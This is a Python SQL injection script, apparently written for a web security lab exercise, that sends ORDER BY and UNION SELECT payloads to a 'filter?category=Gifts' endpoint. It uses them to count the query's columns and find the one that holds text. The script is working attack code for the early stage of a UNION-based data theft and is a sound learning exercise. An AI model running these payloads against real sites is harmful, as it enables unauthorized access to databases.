import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import pyfiglet

# Display a banner using pyfiglet
ascii_banner = pyfiglet.figlet_format("RuhanSec")
print(ascii_banner)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = "filter?category=Gifts"
    for i in range(1, num_col+1):
        string = "'v2F6UA'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        ''' *i is the current iteration variable, representing the column number being processed in the loop.

    *i-1 is used to convert the column number to a zero-based index because lists in Python are zero-indexed. For example, if i is 1 (representing the first column), i-1 becomes 0.

    *payload_list[i-1] refers to the specific element in the list (payload_list) at the calculated index.

    *string is the sample string payload, which is assigned to the element at the calculated index.'''

        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            '''.strip('\'') is used to remove single quotes (') from both ends of the string.
             This is done to handle cases where the server might return the string with or without single quotes. 
             The strip() method removes leading and trailing characters from the string.'''
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")

